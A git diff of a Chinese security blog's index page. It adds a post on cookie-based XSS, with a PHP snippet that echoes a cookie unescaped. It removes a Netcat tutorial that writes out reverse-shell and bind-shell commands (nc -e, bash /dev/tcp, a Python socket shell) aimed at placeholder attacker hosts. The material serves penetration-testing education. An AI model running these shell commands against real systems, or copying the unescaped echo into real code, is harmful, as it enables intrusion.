@@ -59,6 +59,72 @@
 
   
     
+    <h3 class="article-title"><a href="/2019/09/08/XSS-via-HTTP-Headers/"><span>XSS via HTTP Headers</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/09/08/XSS-via-HTTP-Headers/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-09-08T03:06:22.000Z">
+          2019-09-08
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><strong>XSS via HTTP Headers</strong></p>
+<p>​        在看到<a href="https://brutelogic.com.br/blog/" target="_blank" rel="noopener">BRUTE XSS</a>有一个通过HTTP Headers进行XSS的练习，觉得蛮有意思的，也特别适合当作XSS的入门练习题，我来记录下，有需要的童鞋可以来围观下！</p>
+<p>​        先来说下HTTP Headers XSS，一般在某些情况下，对来自应用程序的某个HTTP头部中的数据未做一些正确的过滤处理，从而就会产生XSS的情况。</p>
+<p>​        我们来看下源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$name = $_COOKIE[&quot;name&quot;];</span><br><span class="line">if ($name) &#123;</span><br><span class="line">	echo &quot;&lt;p&gt;welcome,$name!&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	echo &quot;&lt;p&gt;welcome guest!&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>​        通过分析源码，我们可以看到PHP代码未对HTTP cookie做任何的过滤或者处理，直接将cookie中的name字段echo到页面，那么此处就会存在XSS。</p>
+<p>我们先跑起来环境，如下图</p>
+<p><img src="/2019/09/08/XSS-via-HTTP-Headers/xss.png" alt=""></p>
+<p>正常情况下，我们访问到的页面如上图所示，我们也可以通过curl来访问；</p>
+<p><img src="/2019/09/08/XSS-via-HTTP-Headers/xss1.png" alt=""></p>
+<p>接下来，我们通过curl 向HTTP Header的cookie注入XSS</p>
+<p><img src="/2019/09/08/XSS-via-HTTP-Headers/xss2.png" alt=""></p>
+<p>我们已经看到，XSS脚步已经通过cookie注入显示到页面了，已经可以完美XSS了，对！弹框必须有</p>
+<p><img src="/2019/09/08/XSS-via-HTTP-Headers/xss3.png" alt=""></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/xss/">xss</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2019/09/07/构建Linux可读写文件系统/"><span>构建Linux可读写文件系统</span></a></h3>
     
   
@@ -873,79 +939,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; put /path/readme.txt # 上传 readme.txt 文件</span><br><span class="line">ftp&gt; mput *.txt           # 可以上传多个文件</span><br></pre></td></tr></table></figure>
 <p>内容来自【<a href="https://wangchujiang.com/linux-command/c/ssh.html】" target="_blank" rel="noopener">https://wangchujiang.com/linux-command/c/ssh.html】</a></p>
 <p>整理为笔记以记之</p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/Tools/">Tools</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/12/03/Netcat-工具使用/"><span>Netcat 工具使用</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/12/03/Netcat-工具使用/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-12-03T15:06:06.000Z">
-          2018-12-03
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h4 id="Netcat的工具使用总结："><a href="#Netcat的工具使用总结：" class="headerlink" title="Netcat的工具使用总结："></a>Netcat的工具使用总结：</h4><p>一，Netcat Banner获取</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port]</span><br></pre></td></tr></table></figure>
-<p>二，文件传输</p>
-<p>例如我们想在目标主机上执行远程命令，所以需要将文件从攻击主机传输到目标主机。首先，设置一个侦听器，并从攻击主机连接到它。使用端口8888用于此目的，将该文件安全保存到桌面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888 &gt; 文件路径</span><br></pre></td></tr></table></figure>
-<p>在攻击机上，我们连接到该8888端口并发送文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] &lt; 文件路径</span><br></pre></td></tr></table></figure>
-<p>三，Bind Shells &amp;Reverse Shells</p>
-<p>在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。</p>
-<p>Reverse Shell:</p>
-<p>1.设置一个Netcat侦听器，（我们侦听端口8888）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
-<p>2.接下来我们在目标主机上执行下面的命令来连接我们的攻击主机（记住我们在这个攻击主机上执行了远程代码）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] -e /bin/bash    &lt;for linux&gt;</span><br><span class="line">nc.exe [ip-address] [port] -e cmd.exe  &lt;for windows&gt;</span><br></pre></td></tr></table></figure>
-<p>若目标主机没有Netcat，我们使用其他方法来代替</p>
-<p>Bash反向shell，使用Bash通过使用以下命令从目标主机启动反向shell连接攻击主机：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &amp;/dev/tcp/[ip-address]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>python反向shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c’import socket，subprocess，os; s = socket.socket(socket.AF_INET，socket.SOCK_STREAM); s.connect((“[ip-address]”，[port])); os.dup2（s.fileno()，0); os.dup2(s.fileno()，1); os.dup2(s.fileno()，2); P = subprocess.call([“/ bin / sh”，” - i”]);”</span><br></pre></td></tr></table></figure>
-<p>Bind Shell:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Attacker:nc [ip-address] [port]</span><br><span class="line">Target:  nc -lvp [port] -e /bin/sh</span><br></pre></td></tr></table></figure>
 
       
     </div>
